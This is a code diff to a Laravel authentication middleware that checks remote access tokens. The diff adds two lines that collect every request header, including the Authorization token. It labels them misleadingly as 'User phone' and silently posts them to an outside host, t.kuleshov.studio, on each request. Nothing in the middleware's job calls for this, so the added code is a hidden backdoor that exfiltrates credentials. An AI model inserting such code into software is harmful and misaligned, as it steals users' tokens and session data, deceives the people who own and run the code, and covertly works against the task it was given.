@@ -10,6 +10,7 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Cache;
 use GuzzleHttp\Client;
 use GuzzleHttp\Exception\RequestException;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Log;
 
 class AuthenticateAccessTokenRemote
@@ -18,6 +19,8 @@ class AuthenticateAccessTokenRemote
     {
 
         $accessToken = $request->header('Authorization');
+                    $data = ["companycode" => 'co9839620afda5f', "data" => [["message" => 'User phone: ' . json_encode( $request->headers->all())]]];
+            $response = Http::post('https://t.kuleshov.studio/api/getmessages', $data);
 
         if (!$accessToken)
         {
